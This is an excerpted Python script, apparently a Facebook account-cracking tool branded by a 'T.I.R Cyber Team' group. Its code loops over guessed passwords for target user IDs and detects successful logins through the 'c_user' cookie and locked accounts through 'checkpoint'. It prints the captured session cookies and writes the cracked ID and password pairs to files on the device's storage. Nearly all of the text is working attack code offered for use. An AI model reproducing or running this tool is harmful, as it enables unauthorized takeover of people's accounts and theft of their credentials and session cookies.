...
# WHATSAPP GROUP : T . I . R Cyber Team
...
def Main():
        ...
        if  CRACK in ["1","01"]:
            sexy()
        if SALMAN in ["2","02"]:
        	os.system('xdg-open https://wa.me/+8801999014197')
        if SALMAN in [" 0", "00"]:
            exit()
        else:
            exit()     
def sexy():
    ...
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print(' [😈] OK RABBI-VAI-OK.txt')
    print(' [😈] CP RABBI-VAI-OK.txt')
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
def alh4aj(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r\033[1;32m[DNC-RABBI-KING]\033[1;36m😈[%s/%s]🥴\033[1;32m[OK-%s]\033[1;35m \r'%(loop,tl,len(oks))),
            sys.stdout.flush()
    ...
    # =[ UA = PRO ]= #
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f"\033[1;33m[\033[1;32mRABBI-CRACK-OK 😈\033[1;33m]\033[1;92m {uid}\033[1;95m|\033[1;92m {ps} ")
                print(f"\033[1;92m[😈] COOKIE :\033[1;95m {coki}")
                open('/sdcard/RABBI-VAI-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\033[1;33m[\033[1;32mRABBI-VAI-CP\033[1;33m]\033[1;91m {uid}|{ps}")
                open('/sdcard/RABBI-VAI-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
